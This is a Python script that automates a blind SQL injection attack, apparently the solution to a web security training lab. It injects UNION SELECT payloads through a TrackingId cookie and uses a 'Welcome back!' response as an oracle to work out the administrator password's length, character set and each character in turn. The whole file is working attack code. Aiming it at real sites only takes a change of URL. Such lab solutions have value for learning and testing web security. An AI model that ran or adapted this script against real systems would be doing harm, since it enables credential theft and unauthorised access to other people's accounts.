import requests
import string


url = "https://acfb1f211ffff812808f562100f20028.web-security-academy.net/"
cookie_name = "TrackingId"
s = requests.Session()


def good_guess(session, cookie, payload):
    domain = cookie.domain
    path = cookie.path
    session.cookies.set(cookie_name, payload, domain=domain, path=path)
    welcome = "Welcome back!"
    return welcome in session.get(url).text

def get_length(session, cookie):
    length_template = (
        "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'"
        "+AND+length(password)>{length}--"
    )
    length = 1
    unknown = True
    while unknown:
        payload = length_template.format(length=length)
        if good_guess(session, cookie, payload):
            length += 1
        else:
            return length

def get_chars(session, cookie):
    choices = string.ascii_letters + string.digits #+ string.punctuation
    char_template = (
        "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'"
        "+AND+password+like+'%25{char}%25'--"
    )
    return [
        c for c in choices
        if good_guess(session, cookie, char_template.format(char=c))
    ]

def get_password(session, cookie, chars, length):
    password = ""
    password_template = (
        "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'"
        "+AND+substring(password,{position},1)='{char}'--"
    )
    for position in range(1, length + 1):
        for c in chars:
            payload = password_template.format(position=position, char=c)
            if good_guess(session, cookie, payload):
                password += c
                print(password)
                break
    return password

s.get(url)
cookies = list(s.cookies)
cookie = next(c for c in cookies if c.name == cookie_name)
if cookie:
    length = get_length(s, cookie)
    chars = get_chars(s, cookie)
    #print(length, chars)
    #print(chars)
    #print(length)
    password = get_password(s, cookie, chars, length)
    print(password)
    print("done")